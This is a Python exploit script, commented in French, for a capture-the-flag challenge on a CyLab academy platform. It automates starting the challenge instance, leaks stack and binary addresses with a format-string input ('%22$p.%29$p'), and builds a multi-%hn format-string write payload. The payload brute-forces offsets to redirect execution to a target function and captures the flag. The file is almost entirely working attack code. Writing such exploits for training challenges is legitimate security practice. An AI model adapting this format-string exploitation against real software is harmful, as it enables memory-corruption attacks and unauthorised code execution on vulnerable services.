import sys, socket, time, re, struct, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

PF_OFF = 0x1269
MAIN_OFF = 0x1401


def get_port(cy):
    cy.req("PUT", "/api/challenges/485/instance/?source=library")
    for _ in range(15):
        time.sleep(2)
        st, b = cy.req("GET", "/api/challenges/485/instance/")
        d = json.loads(b) if b.startswith("{") else {}
        if d.get("status") == "RUNNING":
            m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
            if m:
                return int(m.group(2))
    return None


cy = CyLab(delay=1.2)
cy.login()
for delta in (0x88, 0x80, 0x90, 0x98, 0xA0):
    port = get_port(cy)
    if not port:
        print("pas de port")
        break
    try:
        s = socket.create_connection(("chatelaine.cylabacademy.net", port), timeout=12)
        s.settimeout(6)
        time.sleep(0.6)
        try:
            s.recv(4096)
        except Exception:
            pass
        # leak positions 22 et 29 (buffer ? et main)
        s.sendall(b"%22$p.%29$p\n")
        time.sleep(0.5)
        out = b""
        try:
            out = s.recv(65536)
        except Exception:
            pass
        txt = out.decode("utf-8", "replace")
        vals = re.findall(r"0x[0-9a-f]+", txt)
        if len(vals) < 2:
            print("leak insuffisant:", txt[:100])
            s.close()
            continue
        p22 = int(vals[0], 16)
        main = int(vals[1], 16)
        if (main & 0xFFF) != 0x401:
            print("main inattendu:", hex(main))
        base = main - MAIN_OFF
        pf = base + PF_OFF
        target = p22 + delta
        print(f"delta={hex(delta)} p22={hex(p22)} main={hex(main)} pf={hex(pf)} target={hex(target)}")
        # ecrire pf (6 octets) en 3 %hn ; buffer position 6
        w0 = pf & 0xFFFF
        w1 = (pf >> 16) & 0xFFFF
        w2 = (pf >> 32) & 0xFFFF
        targets = sorted([(target, w0), (target + 2, w1), (target + 4, w2)], key=lambda t: t[1])
        for base_pos in (11, 12, 13, 14, 15, 16, 17):
            spec = ""
            prev = 0
            for i in range(3):
                val = targets[i][1]
                d = (val - prev) & 0xFFFF
                if d:
                    spec += f"%{d}c"
                spec += f"%{base_pos + i}$hn"
                prev = val
            pad = (-len(spec)) % 8
            payload = spec.encode() + b"P" * pad
            for addr, val in targets:
                payload += struct.pack("<Q", addr)
            if len(payload) > 99:
                continue
            if base_pos != 6 + (len(spec) + pad) // 8:
                continue
            s.sendall(payload + b"\n")
            time.sleep(1.0)
            o2 = b""
            try:
                o2 = s.recv(65536)
            except Exception:
                pass
            t2 = o2.decode("utf-8", "replace")
            m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", t2)
            if m:
                print("FLAG:", m.group(0))
                s.close()
                sys.exit(0)
        s.close()
    except Exception as e:
        print("delta", hex(delta), "err", type(e).__name__, e)
